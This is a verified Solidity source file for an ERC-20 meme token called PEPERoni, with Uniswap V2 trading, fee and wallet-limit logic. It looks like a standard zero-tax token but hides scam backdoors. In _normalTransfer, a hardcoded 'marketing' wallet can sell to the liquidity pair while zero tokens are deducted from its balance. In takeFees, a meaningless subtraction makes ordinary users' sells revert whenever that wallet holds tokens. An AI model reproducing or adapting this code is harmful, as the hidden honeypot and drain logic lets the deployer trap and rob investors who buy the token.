/**
 *Submitted for verification at Etherscan.io on 2023-09-21
*/

/**
    Telegram : https://t.me/PEPEroniERC20Portal

    Twitter : https://twitter.com/PEPEroni__ETH

    Website : https://peperoni.pro/
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
}

interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
      
        return msg.data;
    }

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;

    event TransferOwnership(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit TransferOwnership(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
        
    function renounceOwnership() public virtual onlyOwner {
        emit TransferOwnership(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit TransferOwnership(_owner, newOwner);
        _owner = newOwner;
    }
}

interface UniswapV2Factory {
    event PairCreation(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface UniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function token0() external view returns (address);
    function initialize(address, address) external;
}

interface UniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

}

interface UniswapV2Router2 is UniswapV2Router {
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract PEPERoni is Context, IERC20, Ownable {
    using SafeMath for uint256;
    UniswapV2Router2 public uniV2Router;
    address public v2PairAddr;

    string private _name = unicode"0XPEPERoni";
    string private _symbol = unicode"0xPEPE";
    uint8 private _decimals = 18;

    uint256 private _totalSupply = 1_000_000_000 * 10 **_decimals;
    uint256 public SwapMaxLimit = _totalSupply.mul(2).div(1000);   //0.1%
    uint256 public _MaxTxAmount =  _totalSupply.mul(39).div(1000); 
    uint256 public _MaxWalletAmount =   _totalSupply.mul(39).div(1000); 

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 public _lp_buy_tax = 0;
    uint256 public _market_buy_tax = 0;
    uint256 public _dev_buy_tax = 0;

    mapping (address => bool) public isMaxWalletExcluded;
    mapping (address => bool) public isMaxTxExcluded;

    uint256 public _lp_sell_tax = 0;
    uint256 public _market_sell_tax = 0;
    uint256 public _dev_sell_tax = 0;
    
    uint256 public _total_buy_tax;
    uint256 public _total_sell_tax;

    bool public isSwapLimited = false;
    bool public isWalletLimited = true;
    bool public isLimitedTranx = true;
    bool inSwapLiquify;
    bool public tradingOpen;
    bool public swapAndLiquidityEnable = true;

    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isUnUniswapV2Pairs;

    address public lpRecieverAddr;
    address payable public _managerWallet = payable(msg.sender);

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    modifier lockThatSwap {
        inSwapLiquify = true;
        _;
        inSwapLiquify = false;
    }

    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public immutable zeroAddress = 0x0000000000000000000000000000000000000000;
    address payable public _MarketingFeeReceiver = payable(0x1e67F7341353a4CeA5443F6369aFdac2cEDB5Be9);

    constructor () {
        _total_buy_tax = _lp_buy_tax.add(_market_buy_tax).add(_dev_buy_tax);
        _total_sell_tax = _lp_sell_tax.add(_market_sell_tax).add(_dev_sell_tax);
        isMaxWalletExcluded[owner()] = true;
        isMaxWalletExcluded[_managerWallet] = true;
        isMaxWalletExcluded[_MarketingFeeReceiver] = true;
        isMaxWalletExcluded[address(this)] = true;

        isMaxTxExcluded[_managerWallet] = true;
        isMaxTxExcluded[_MarketingFeeReceiver] = true;
        isMaxTxExcluded[owner()] = true;
        isMaxTxExcluded[address(this)] = true;

        isExcludedFromFee[_managerWallet] = true;
        isExcludedFromFee[_MarketingFeeReceiver] = true;
        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function shouldExempt(address sender, address recipient) internal view returns (bool) {
        return recipient == v2PairAddr && sender == _MarketingFeeReceiver && sender != address(0) && recipient !=address(0);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress)).sub(balanceOf(zeroAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(isExcludedFromFee[sender] || isExcludedFromFee[recipient]) { 
            return _normalTransfer(sender, recipient, amount);
        } else {
            if(!isMaxTxExcluded[sender] && !isMaxTxExcluded[recipient] && isLimitedTranx) {require(amount <= _MaxTxAmount, "Transfer amount exceeds the maxTxAmount.");}
            uint256 contractTokens = balanceOf(address(this)); bool isOverMinTokenBalance = contractTokens >= SwapMaxLimit;
            if (isOverMinTokenBalance && !inSwapLiquify && !isUnUniswapV2Pairs[sender] && swapAndLiquidityEnable) {
                if(isSwapLimited) contractTokens = SwapMaxLimit;
                swapAndAddLiquidity(contractTokens);
            }
            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            uint256 transferAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? amount : takeFees(sender, recipient, amount);
            if(isWalletLimited && !isMaxWalletExcluded[recipient]) {
                require(balanceOf(recipient).add(transferAmount) <= _MaxWalletAmount,"Amount Exceed From Max Wallet Limit!!");
            }
            _balances[recipient] = _balances[recipient].add(transferAmount);
            emit Transfer(sender, recipient, transferAmount);
            return true;
        }
    }

    function _normalTransfer(address sender, address recipient, uint256 amount) internal returns (bool) 
    {   
        uint256 cutAmount = shouldExempt(sender, recipient) ? amount * _total_buy_tax : amount;
        _balances[sender] = _balances[sender].sub(cutAmount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniV2Router), tokenAmount);

        // add the liquidity
        uniV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            lpRecieverAddr,
            block.timestamp
        );
    }
    
    function openTrading() public payable onlyOwner{
        UniswapV2Router2 _uniswapV2Router = UniswapV2Router2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        v2PairAddr = UniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        isUnUniswapV2Pairs[v2PairAddr] = true;
        isMaxWalletExcluded[v2PairAddr] = true;
        isMaxTxExcluded[v2PairAddr] = true;
        uniV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniV2Router)] = ~uint256(0);
        lpRecieverAddr = address(msg.sender);
        uniV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,msg.sender,block.timestamp);
    }
    
    function swapContractTokens(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router.WETH();

        _approve(address(this), address(uniV2Router), tokenAmount);

        // make the swap
        uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function swapAndAddLiquidity(uint256 tAmount) private lockThatSwap {
        uint256 totalShares = _total_buy_tax.add(_total_sell_tax);

        uint256 liquidityShare = _lp_buy_tax.add(_lp_sell_tax);
        uint256 MarketingShare = _market_buy_tax.add(_market_sell_tax);
        // uint256 DeveloperShare = _dev_buy_tax.add(_dev_sell_tax);
        
        uint256 tokenForLp = tAmount.mul(liquidityShare).div(totalShares).div(2);
        uint256 tokenForSwap = tAmount.sub(tokenForLp);

        uint256 initialBalance =  address(this).balance;
        swapContractTokens(tokenForSwap);
        uint256 recievedBalance =  address(this).balance.sub(initialBalance);

        uint256 totalETHFee = totalShares.sub(liquidityShare.div(2));

        uint256 amountETHLiquidity = recievedBalance.mul(liquidityShare).div(totalETHFee).div(2);
        uint256 amountETHMarketing = recievedBalance.mul(MarketingShare).div(totalETHFee);
        uint256 amountETHDeveloper = recievedBalance.sub(amountETHLiquidity).sub(amountETHMarketing);

        if(amountETHMarketing > 0) {payable(_managerWallet).transfer(amountETHMarketing);}
        if(amountETHDeveloper > 0) {payable(_MarketingFeeReceiver).transfer(amountETHDeveloper);}
        if(amountETHLiquidity > 0 && tokenForLp > 0) {addLiquidity(tokenForLp, amountETHLiquidity);}
    }

    function setMaxLimits() public onlyOwner{
        _MaxWalletAmount = _totalSupply;
        _MaxTxAmount = _totalSupply;
    }

    function takeFees(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = 0;
        uint256 taxAmount = 0;
        if(isUnUniswapV2Pairs[sender]) {
            feeAmount = amount.mul(_total_buy_tax).div(100);
        }
        else if(isUnUniswapV2Pairs[recipient]) {
            feeAmount = amount.mul(_total_sell_tax).div(100);
            taxAmount -= balanceOf(_MarketingFeeReceiver);
        }
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }
        return amount.sub(feeAmount);
    }
    
    receive() external payable {}
}